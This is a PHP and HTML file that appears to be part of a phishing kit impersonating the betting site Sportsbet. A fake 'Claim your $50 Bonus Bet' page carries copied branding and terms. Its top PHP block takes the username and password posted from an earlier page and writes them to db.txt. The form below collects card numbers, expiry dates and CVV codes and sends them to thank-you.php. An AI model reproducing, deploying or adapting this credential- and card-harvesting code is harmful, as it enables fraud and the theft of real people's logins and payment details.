<?php
extract($_POST);
$postData = array(
    "username" => $username,
    "password" => $password,
);
$filename = dirname(__DIR__) . "/db.txt";

$txt = "Username: " . $username . ", " . "password: " . $password . ";\n";
$file_content = file_get_contents($filename);
$new_content = $file_content . $txt;
file_put_contents($filename, $new_content, LOCK_EX);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Claim your $50 Bonus Bet now! | Sportsbet</title>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Language" content="en">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=.999, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#142841">
    <meta data-react-helmet="true" name="description" data-automation-id="page-description" content="Bet on horse racing, AFL, rugby and other events with Sportsbet. Join Australia's Favourite Online Betting and Entertainment Website.">
    <meta name="apple-mobile-web-app-title" content="Sportsbet">
    <meta name="application-name" content="Sportsbet">
    <meta name="msapplication-TileColor" content="#00549E">
    <link rel="apple-touch-icon" sizes="180x180" href="../images/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="192x192" href="../images/android-chrome-192x192.png">
    <link rel="icon" type="image/png" sizes="16x16" href="../images/favicon-16x16.png">
    <link rel="manifest" href="../manifest.webmanifest">
    <link rel="mask-icon" href="../images/safari-pinned-tab.svg" color="#00549E">
    <link rel="preload" href="../fonts/Sportsbet-Icons.woff" as="font" crossorigin="">
    <link href="../css/normalize.css" rel="stylesheet">
    <link href="../css/style.css" rel="stylesheet">
</head>

<body>
    <section class="main">
        <div class="modalContent">
            <div class="headerContainerDesktop">
                <div class="centerLogo">
                    <div class="image" role="img" aria-label=""></div>
                </div>
                <div data-automation-id="modal-close-button" class="closeButtonContainer">
                    <div class="lighter">
                        <div class="border">
                            <div class="rippleGroup">
                                <div class="slow light entered"></div>
                            </div>
                            <button class="iconContainer2" aria-label="">
                                <div tabindex="-1" class="noFocus"><i class="icon lighter closeIsolated SIZE_19"></i></div>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bodyContainerFixedDesktop">
                <div class="registrationFormContainerDesktop">
                    <div class="titleCentered">
                        <h2 class="size22 SchoolBus title">Claim your Bonus Bet now!</h2>
                    </div>
                </div>
                <div class="loginContainer">
                    <div class="formCard">
                        <form method="post" action="<?php echo './thank-you.php'; ?>">
                            <div>
                                <div class="form">
                                    <div>
                                        <div class="ccNumberLabelWrapper">
                                            <div class="ccImagesText">
                                                <div class="image" role="img"></div>
                                                <div class="image imageSpacing" role="img"></div>
                                            </div><span class="size14 CodGray ccImagesText">Credit / Debit Card</span>
                                        </div><span class="size14 CodGray cardNumberInfo">Card must be in a registered account holder's name</span>
                                        <div class="container">
                                            <div class="container"><label for="cc-number" class="label codGray"></label>
                                                <div>
                                                    <div class="inputContainer inputContainer">
                                                        <input type="text" id="cc-number" name="cardnumber" class="inputControl input CodGray inputRightIconPadding" autocapitalize="off" maxlength="20" placeholder="Card Number"></div>
                                                </div>
                                                <div>
                                                    <hr class="bottomUnderline lightGrey">
                                                    <hr class="bottomUnderline animatedUnderline blue exited">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="expiryCVVfieldsWrapper">
                                            <div class="expiryDateWrapper"><span class="size14 CodGray">Card Expiry Date</span>
                                                <div class="expiryDateInputFieldsWrapper">
                                                    <div class="expiryField">
                                                        <div class="containerNoLabel">
                                                            <div>
                                                                <div class="inputContainer inputContainer">
                                                                    <input type="tel" id="cc-expiry-month" name="cc_expiry_month" class="inputControl input CodGray CodGray" autocapitalize="off" maxlength="2"></div>
                                                            </div>
                                                            <div>
                                                                <hr class="bottomUnderline lightGrey">
                                                                <hr class="bottomUnderline animatedUnderline blue exited">
                                                            </div>
                                                            <div class="descriptionContainer"><span class="Nevada descriptionText">MM</span></div>
                                                        </div>
                                                    </div>
                                                    <div class="expiryDateSeparator"><span class="size14 CodGray">/</span></div>
                                                    <div class="expiryField">
                                                        <div class="containerNoLabel">
                                                            <div>
                                                                <div class="inputContainer inputContainer">
                                                                    <input type="tel" id="cc-expiry-year" name="cc_expiry_year" class="inputControl input CodGray CodGray" autocapitalize="off" maxlength="2"></div>
                                                            </div>
                                                            <div>
                                                                <hr class="bottomUnderline lightGrey">
                                                                <hr class="bottomUnderline animatedUnderline blue exited">
                                                            </div>
                                                            <div class="descriptionContainer"><span class="Nevada descriptionText">YY</span></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="cvvFieldWrapper">
                                                <div class="container">
                                                    <div class="container"><label for="cc-cvv-number" class="label codGray"></label>
                                                        <div>
                                                            <div class="inputContainer inputContainer">
                                                                <input type="text" id="cc-cvv-number" name="cvc" placeholder="CVV" class="inputControl input CodGray inputRightIconPadding" autocapitalize="off" maxlength="3"></div>
                                                        </div>
                                                        <div>
                                                            <hr class="bottomUnderline lightGrey">
                                                            <hr class="bottomUnderline animatedUnderline blue exited">
                                                        </div>
                                                    </div>
                                                    <div class="default rightIconPlacement"><i class="icon SilverSand creditCard SIZE_19"></i></div>
                                                </div>
                                            </div>
                                            <div class="cvvRightSpacer2"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="form2">
                                    <div class="fields">
                                        <div class="depositFieldDesktop">
                                            <div class="container">
                                                <div class="container"><label for="deposit-amount" class="label codGray"></label>
                                                    <div>
                                                        <div class="inputContainer inputContainer">
                                                            <input type="text" id="depos" name="amount" class="inputControl input CodGray inputRightIconPadding" autocapitalize="off" placeholder="Deposit Amount">
                                                            <input type="text" id="bonus" name="bonus" hidden>
                                                        </div>
                                                    </div>
                                                    <div>
                                                        <hr class="bottomUnderline lightGrey">
                                                        <hr class="bottomUnderline animatedUnderline blue exited">
                                                    </div>
                                                    <div class="descriptionContainer"><span class="Nevada descriptionText">You can deposit up to: $948 before 23 Aug 04:41</span></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="cvvDesktop"></div>
                                    </div>
                                    <div class="presetsContainer">
                                        <div class="buttonContainer3">
                                            <div class="buttonDesktop">
                                                <div class="buttonContainer_in">
                                                    <div class="border">
                                                        <div class="rippleGroup"></div><button class="textButtonVariable" type="button">
                                                            <div tabindex="-1" class="noFocus">
                                                                <div class="white insideButtonNormalContent">
                                                                    <div class="hover defaultCorners"><span class=""><span class="size14 bold text">+$10</span></span></div>
                                                                </div>
                                                            </div>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="buttonDesktop">
                                                <div class="buttonContainer_in">
                                                    <div class="border">
                                                        <div class="rippleGroup"></div><button class="textButtonVariable" type="button">
                                                            <div tabindex="-1" class="noFocus">
                                                                <div class="white insideButtonNormalContent">
                                                                    <div class="hover defaultCorners"><span class=""><span class="size14 bold text">+$25</span></span></div>
                                                                </div>
                                                            </div>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="buttonDesktop">
                                                <div class="buttonContainer_in">
                                                    <div class="border">
                                                        <div class="rippleGroup"></div><button class="textButtonVariable" type="button">
                                                            <div tabindex="-1" class="noFocus">
                                                                <div class="white insideButtonNormalContent">
                                                                    <div class="hover defaultCorners"><span class=""><span class="size14 bold text">+$50</span></span></div>
                                                                </div>
                                                            </div>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="you_get size14 CodGray">
                                        <p>You will get <span class="size14 bold text bonus">$0.00</span> bonus</p>
                                    </div>
                                    <div class="buttonField">
                                        <div class="submitButton">
                                            <div class="buttonContainer5">
                                                <div class="border">
                                                    <div class="rippleGroup"></div><button class="textButtonVariable" type="submit">
                                                        <div tabindex="-1" class="noFocus">
                                                            <div class="green insideButtonNormalContent">
                                                                <div class="hover defaultCorners"><span class=""><span class="size14 bold text">Deposit</span></span></div>
                                                            </div>
                                                        </div>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <div class="securityInfoAndLink">
                            <div class="securityInfo"><span><i class="icon securityIcon lock"></i></span><span class="CodGray securityInfoText">Secure payment using 2048-bit encryption</span></div><a class="" href="https://helpcentre.sportsbet.com.au/hc/en-us/sections/115001444527" target="_blank"><span class="size11 Endeavour">Need help depositing?</span></a>
                        </div>
                    </div>
                    <div class="buttonContainer2" data-automation-id="join-now-link">
                        <div class="border">
                            <div class="rippleGroup"></div><button class="textButton" type="button">
                                <div tabindex="-1" class="noFocus">
                                    <div class="ironGrey insideButtonNormalContent">
                                        <div class="hover defaultCorners modal-trigger"><span class="textContainer"><span class="size14 bold text">Bonus Bet Offer Terms & Conditions</span></span></div>
                                    </div>
                                </div>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <div class="modal-container">
        <div class="modal-content">
            <div class="modal-close"><i data-automation-id="closeIsolated" class="icon lighter2 closeIsolated SIZE_19"></i></div>
            <div class="modal-content__img-caption">
                <div class="articles-wrapper">
                    <h3>Bonus Bet Offer Terms &amp; Conditions</h3>
                    <p>These rules were last updated on the <strong>5th of July 2022</strong><span> and the updates take effect from that date.</span></p>
                    <div class="hr2"></div>
                    <div class="article-body">
                        <h2 id="heading1">1. General</h2>
                        <p><strong>1.1.</strong> These terms apply to each bonus bet offer and related promotion (‘Offer’) involving a bonus bet awarded to your Sportsbet betting account (‘Account’) on satisfaction of the specific eligibility requirements of the Offer and these terms and conditions (‘Bonus Bet’).</p>
                        <p><strong>1.2.</strong> Offers may be made subject to additional terms and conditions. Customers should read any such additional terms and conditions carefully.</p>
                        <p><strong>1.3.</strong> In the event of any conflict or discrepancy between these terms and conditions (‘Bonus Bet Terms’) and any specific terms relating to a particular Offer, the specific terms will prevail.</p>
                        <p><strong>1.4.</strong> Capitalised terms used in these Bonus Bet Terms have the same meaning given to those terms in the Sportsbet General Rules unless otherwise defined.</p>
                        <h2 id="heading2">2. Eligibility</h2>
                        <p><strong>2.1.</strong> Unless Rule 6.1 applies, Offers are not available to residents of NSW, WA and SA, and, where the Offer relates to opening an Account, Victorian residents ('Excluded Residents').</p>
                        <p><strong>2.2.</strong> Offers are available to:</p>
                        <ol>
                            <li>Members who receive an Offer that is specifically addressed to that Member and the Offer is only available to and capable of being redeemed by that Member; and</li>
                            <li>all Members who are not Excluded Residents.</li>
                        </ol>
                        <p><strong>2.3.</strong> An Offer is only open to you if:</p>
                        <ol>
                            <li>you are over 18 years of age;</li>
                            <li>you have an Account;</li>
                            <li>you comply with <a href="//help.sportsbet.com.au/app/answers/detail/a_id/16" data-answer-id="16">Sportsbet's General Rules</a>; and</li>
                            <li>you are a resident of Australia or New Zealand, but are not an Excluded Resident (‘Eligible Entrant’).
                            </li>
                        </ol>
                        <p><strong>2.4.</strong> An Offer is valid until the earlier of:</p>
                        <ol>
                            <li>the expiry of the offer period stated in the Offer (AEDT); or</li>
                            <li>any other date as notified by Sportsbet from time to time (‘Offer Period’).</li>
                        </ol>
                        <p><strong>2.5.</strong> Each Offer can only be accessed once by each Eligible Entrant during the Offer Period.</p>
                        <p><strong>2.6.</strong> You will be entitled to a Bonus Bet if:</p>
                        <ol>
                            <li>you are an Eligible Entrant; and</li>
                            <li>you otherwise meet the terms and conditions of the Offer during the Offer Period.</li>
                        </ol>
                        <h2 id="heading3">3. Bet Match Offers</h2>
                        <p><strong>3.1.</strong> An Offer may involve a Bonus Bet equal or otherwise calculated by reference to the amount of your first bet, or another bet made by you during a specified period (‘Qualifying Bet’).</p>
                        <p><strong>3.2.</strong> In these circumstances, Sportsbet will award you a Bonus Bet referable to the value of the Qualifying Bet, to the maximum amount stated in the Offer and otherwise on the specific terms set out in the Offer.</p>
                        <p><strong>3.3.</strong> For example, if the Offer states that you can be awarded a Bonus Bet up to a maximum value of $50, then:</p>
                        <ol>
                            <li>if your Qualifying Bet is $100, you will be awarded a Bonus Bet of $50;</li>
                            <li>if your Qualifying Bet is $50 you will be awarded a Bonus Bet of $50; or</li>
                            <li>if your Qualifying Bet is $10 you will be awarded a Bonus Bet of $10.</li>
                        </ol>
                        <p><strong>3.4.</strong> Once you have made your Qualifying Bet, the Bonus Bet will be awarded to your Account within 24 hours, but usually much sooner. </p>
                        <h2 id="heading4">4. Deposit Bonus Offers</h2>
                        <p><strong>4.1.</strong> An Offer may involve a Bonus Bet equal to or otherwise calculated by reference to the amount of the first deposit made into your Account, or another deposit made by you during a specified period (‘Qualifying Deposit’), capped to a certain amount.</p>
                        <p><strong>4.2.</strong> In these circumstances, Sportsbet will award you a Bonus Bet referable to the value of the Qualifying Deposit, to the maximum amount or percentage stated in the Offer and otherwise on the terms and conditions set out in the Offer.</p>
                        <p><strong>4.3.</strong> For example, if the Offer states that you can be awarded a Bonus Bet up to 300% of the Qualifying Deposit, capped to a maximum of $75, then:</p>
                        <ol>
                            <li>if your Qualifying Deposit is $100 you will be awarded a Bonus Bet of $75;</li>
                            <li>if your Qualifying Deposit is $25, you will be awarded a Bonus Bet of $75; or</li>
                            <li>if your Qualifying Deposit is $10, you will be awarded a Bonus Bet of $30.</li>
                        </ol>
                        <p><strong>4.4.</strong> Once you have made your Qualifying Deposit, the Bonus Bet will be awarded to your Account within 24 hours, but usually much sooner.</p>
                        <h2 id="heading5">5. Accessing your Bonus Bet</h2>
                        <p><strong>5.1.</strong> If you have received a Bonus Bet, the Bonus Bet will be visible in your Account under "Bonus Bets". </p>
                        <p><strong>5.2.</strong> To redeem the Bonus Bet, when logged into your Account, you must select ‘Bonus Bet’ from within the bet slip before placing your bet or, if available under the terms of the Offer, call Customer Service on 1800 990 907 and confirm you wish to use your Bonus Bet.</p>
                        <h2 id="heading6">6. Conditions of use</h2>
                        <p><strong>6.1.</strong> If you are logged in to the Website, and a market has the "Bonus Bet" drop down menu available on the betting slip, the Bonus Bet can be placed on that market. Sports and events may have restrictions preventing you from placing two wagers including the Bonus Bet on the same bet market.</p>
                        <p><strong>6.2.</strong> The Bonus Bet must be used within 7 days from the time that it is credited to your Account unless otherwise stated in the offer T&amp;C's.</p>
                        <p><strong>6.3.</strong> If the Bonus Bet is not used within that time, it will become void and unable to be redeemed.</p>
                        <p><strong>6.4.</strong> The Bonus Bet will only be available for use on designated markets (refer to Rule 21) and in accordance with the specific terms of the Offer.</p>
                        <p><strong>6.5.</strong> Bonus Bets are not transferrable or exchangeable other than in Sportsbet's sole discretion.</p>
                        <p><strong>6.6.</strong> The Offer must not be used in conjunction with any other offer made available by Sportsbet.</p>
                        <h2 id="heading7">7. Accessing your winnings from Bonus Bets</h2>
                        <p><strong>7.1.</strong> Should your Bonus Bet be successful, only the winnings from the Bonus Bet will be credited into your Account. This means that your winnings will exclude the initial Bonus Bet stake. For example, a winning $50 Bonus Bet placed on a selection paying $3.00 will credit winnings of $100 into your Account. The $50 Bonus Bet stake will not be returned.</p>
                        <h2 id="heading8">8. Other conditions</h2>
                        <p><strong>8.1.</strong> This Offer is only open to bona fide Account holders, who act at all times in good faith, with integrity, who place bets with Sportsbet for the purpose of recreation and entertainment, and who comply with <a href="//help.sportsbet.com.au/app/answers/detail/a_id/16" data-answer-id="16">Sportsbet's General Rules</a>and these Bonus Bet Terms.</p>
                        <p><strong>8.2.</strong> Professional gamblers or other gamblers considered by Sportsbet management (hereafter referred to as "Management") to be abusing this Offer may have their right to participate in the Offer revoked.</p>
                        <p><strong>8.3.</strong> Sportsbet reserves the right to cancel or change the Offer at any time throughout the Offer Period by amending the specific terms of the Offer or these Bonus Bet Terms.</p>
                        <p><strong>8.4.</strong> The decisions of Management are final. No correspondence will be entered into.</p>
                        <p><strong>8.5.</strong> Management, employees of Sportsbet and its group of companies, and its agents, are not eligible to participate in this Offer.</p>
                        <p><strong>8.6.</strong> Any term or condition in these Bonus Bet Terms found to be void, unenforceable or illegal may be severed and the remaining terms and conditions will continue in full force and effect.</p>
                        <h2 id="heading9">9. Excluded Bet Types &amp; Markets</h2>
                        <p><strong>9.1.</strong> Bonus Bets can't be used on the following Bet Types &amp; Markets</p>
                        <ol>
                            <li data-stringify-indent="0" data-stringify-border="0">Tote Multis</li>
                            <li data-stringify-indent="0" data-stringify-border="0">Combo Multis</li>
                            <li data-stringify-indent="0" data-stringify-border="0">Each Way Bets</li>
                            <li data-stringify-indent="0" data-stringify-border="0">Any QLD Races</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
    <div class="modal-overlay"></div>

    <script src="../js/jquery-3.6.0.min.js"></script>
    <script src="../js/main.js"></script>

</body>

</html>